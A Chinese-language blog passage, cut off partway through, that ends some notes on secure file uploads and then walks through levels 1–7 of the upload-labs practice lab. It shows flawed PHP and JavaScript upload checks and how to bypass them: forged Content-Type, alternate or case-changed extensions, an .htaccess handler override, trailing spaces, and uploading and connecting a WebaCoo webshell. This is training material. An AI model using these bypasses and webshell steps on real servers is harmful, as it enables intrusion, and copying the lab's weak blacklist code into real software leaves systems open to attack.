<h5 id="2、判断文件类型"><a href="#2、判断文件类型" class="headerlink" title="2、判断文件类型"></a>2、判断文件类型</h5><p>在判断文件类型时，可以结合使用MIME Type、后缀名检查等方法。在文件类型检查中，强烈推荐使用白名单，黑名单的方式不可靠。对于图片的处理，可以使用压缩函数resize()函数，在处理图片的同时破坏图片中可能包含的HTML代码。</p>
<h5 id="3、使用随机数该写文件名和文件路径"><a href="#3、使用随机数该写文件名和文件路径" class="headerlink" title="3、使用随机数该写文件名和文件路径"></a>3、使用随机数该写文件名和文件路径</h5><p>文件上传如果要执行代码，则需要用户能够访问到这个文件，在某些环境中，用户能上传，但不能访问，如果应用使用随机数改写了文件的路径，将极大地增加了攻击的成本。与此同时，像shell.php.rar.rar这种文件，或者是crossdomain.xml这种文件，都将因为文件名被改写而无法成功实施攻击</p>
<h5 id="4、单独设置文件服务器的域名"><a href="#4、单独设置文件服务器的域名" class="headerlink" title="4、单独设置文件服务器的域名"></a>4、单独设置文件服务器的域名</h5><p>由于浏览器同资源策略的关系，一系列客户端攻击将失效，比如上传rossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决</p>
<p>当然这只是简单的文件上传预防，如果还要考虑病毒、木马、色情图片与视频，反政治文件等等，需要做的就非常多了，文件上传看似简单，但要实现一个安全的上传功能是非常不容易的</p>
]]></content>
  </entry>
  <entry>
    <title>upload-labs关卡</title>
    <url>/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/</url>
    <content><![CDATA[<h4 id="upload-labs第一关"><a href="#upload-labs第一关" class="headerlink" title="upload-labs第一关"></a>upload-labs第一关</h4><h5 id="upload-labs第一关有两种方法绕过"><a href="#upload-labs第一关有两种方法绕过" class="headerlink" title="upload-labs第一关有两种方法绕过"></a>upload-labs第一关有两种方法绕过</h5><p>第一种使用burpsuit</p>
<p>第二种F12将JS过滤源码删除</p>
<p>查看界面</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407135006062.png" alt="image-20200407135006062"></p>
<p>上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407135530806.png" alt="image-20200407135530806"></p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>判断了验证点在前端，查看JS判断代码，F12找到判断代码</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407140025900.png" alt="image-20200407140025900"></p>
<p>把代码抠出来整理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传</p>
<p>现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407140430474.png" alt="image-20200407140430474"></p>
<p>查看页面，返回空白图片说明成功</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407140524961.png" alt="image-20200407140524961"></p>
<p>查看根目录</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407140616118.png" alt="image-20200407140616118"></p>
<p>使用第二种方法，删除检查源码进行上传</p>
<p>按F12打开源码</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407141341729.png" alt="image-20200407141341729"></p>
<p>删除红线处的内容onsubmit</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407141406254.png" alt="image-20200407141406254"></p>
<p>提交内容，页面返回空白说明正确</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407141521547.png" alt="image-20200407141521547"></p>
<p>查看根目录</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407141622318.png" alt="image-20200407141622318"></p>
<p>可以使用菜刀连接</p>
<h4 id="upload-labs第二关"><a href="#upload-labs第二关" class="headerlink" title="upload-labs第二关"></a>upload-labs第二关</h4><h5 id="查看代码"><a href="#查看代码" class="headerlink" title="查看代码"></a>查看代码</h5><p>这里只对Content-type进行了检查，只有当Content-type等于image/jpeg等格式才能上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line"></span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>使用burp抓包，更改Content-type的值</p>
<p>上传php文件Content-type的值是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span><br></pre></td></tr></table></figure>

<p>需要将Content-Type中的值改为image/jpeg等可以上传的格式</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407142209535.png" alt="image-20200407142209535"></p>
<p>查看页面，页面返回空白，说明上传成功</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407142228744.png" alt="image-20200407142228744"></p>
<p>查看根目录</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407142309837.png" alt="image-20200407142309837"></p>
<p>可以使用菜刀连接</p>
<h4 id="upload-labs第三关"><a href="#upload-labs第三关" class="headerlink" title="upload-labs第三关"></a>upload-labs第三关</h4><h5 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h5><p>可以看到服务器做了一个黑名单验证过滤了’.asp’,’.aspx’,’.php’,’.jsp’</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。</p>
<h6 id="注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All"><a href="#注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All" class="headerlink" title="注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All"></a><em>注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</em></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</span><br></pre></td></tr></table></figure>

<h5 id="配置文件http-conf"><a href="#配置文件http-conf" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
<p>默认情况下红框内会出现None，将None修改为All</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407143520423.png" alt="image-20200407143520423"></p>
<p>这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀</p>
<p>使用一下其中一个，当然不止这些扩展名，还有很多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>上传php文件使用burp抓包</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407145002372.png" alt="image-20200407145002372"></p>
<p>将shell.php改为shell.phps</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407145030124.png" alt="image-20200407145030124"></p>
<p>Forward放行，页面返回空白图片</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407145105478.png" alt="image-20200407145105478"></p>
<p>右键选择复制图片地址在浏览器中打开，成功返回结果</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407145158676.png" alt="image-20200407145158676"></p>
<h4 id="upload-labs第四关"><a href="#upload-labs第四关" class="headerlink" title="upload-labs第四关"></a>upload-labs第四关</h4><h5 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，黑名单里php、php3等这种后缀全部不允许上传，但并没有限制.htaccsess文件。故可以上传.htaccsess文件绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在桌面你新建一个one.txt，里面写入SetHandler application/x-httpd-php内容另存为.htaccess</p>
<p><img src="/2020/04/08/upload-labs%E5%85%B3%E5%8D%A1/upload%5Cimage-20200407151641458.png" alt="image-20200407151641458"></p>
<p>页面进行上传，会返回一个空图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585720364221.png" alt="1585719758584"></p>
<p>复制图片链接，打开新的网址，会出现403，会显示</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585719831410.png" alt="1585719740191"></p>
<p>这说明你文件已经上传了，但是你没有权限去访问他</p>
<p>在上传一个图片，图片包含phpinfo探针</p>
<p>使用文本编写php代码</p>
<?php 

​    phpinfo();

?>

<p>保存为1.jpg进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154104175.png" alt="image-20200407154104175"></p>
<p>复制图片地址在浏览器中打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154202446.png" alt="image-20200407154202446"></p>
<h4 id="upload-labs第五关"><a href="#upload-labs第五关" class="headerlink" title="upload-labs第五关"></a>upload-labs第五关</h4><h5 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，此处的黑名单比Pass-04多了.htaccess，所有不能通过.htaccsess进行绕过了。但此处代码没有将文件名统一转成小写，可以通过大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>用burp将后缀改为大写PHP即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154604250.png" alt="image-20200407154604250"></p>
<p>放行查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154622841.png" alt="image-20200407154622841"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154646284.png" alt="image-20200407154646284"></p>
<h4 id="WebaCoo上传Webshell"><a href="#WebaCoo上传Webshell" class="headerlink" title="WebaCoo上传Webshell"></a>WebaCoo上传Webshell</h4><p>WebaCoo生成Webshell：webacoo -g -o a.php</p>
<p>上传Webshell</p>
<p>连接Webshell：webacoo -t -u Webshell地址</p>
<h5 id="在kali中使用webacoo新建一个a-php文件"><a href="#在kali中使用webacoo新建一个a-php文件" class="headerlink" title="在kali中使用webacoo新建一个a.php文件"></a>在kali中使用webacoo新建一个a.php文件</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154837626.png" alt="image-20200407154837626"></p>
<p>将文件复制到本地文件中，将后缀名改为大小写结合的PhP</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407154923154.png" alt="image-20200407154923154"></p>
<p>上传复制会返回空白图片，复制图片连接，在另一个页面打开这个地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585788531529.png" alt="1585786501683"></p>
<p>复制这个地址去kali连接webshell，使用webacoo -t -u “URL”命令</p>
<p>注意：在URL中，因为是从本地copy到kali中的，本地的靶场是127.0.0.1，但在kali中没有127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webacoo -t -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;a.PhP&quot;</span><br></pre></td></tr></table></figure>

<p>我们需要修改成本地地址<br>打开cmd使用ipconfig查看当前地址，将127.0.0.1改为当前地址，出现这个页面就说明连接成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407155130449.png" alt="image-20200407155130449"></p>
<p>使用ipconfig可以查看本地ip等等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1585786793204.png" alt="1585786724856"></p>
<h4 id="upload-labs第六关"><a href="#upload-labs第六关" class="headerlink" title="upload-labs第六关"></a>upload-labs第六关</h4><h5 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h5><p>可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为Windows特性所以不能在Windows下加空格，在kali中加入空格</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407172124838.png" alt="image-20200407172124838"></p>
<p>进行上传，页面返回空白</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407172944247.png" alt="image-20200407172944247"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407173101652.png" alt="image-20200407173101652"></p>
<h4 id="upload-labs第七关"><a href="#upload-labs第七关" class="headerlink" title="upload-labs第七关"></a>upload-labs第七关</h4><h5 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h5><p>从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext 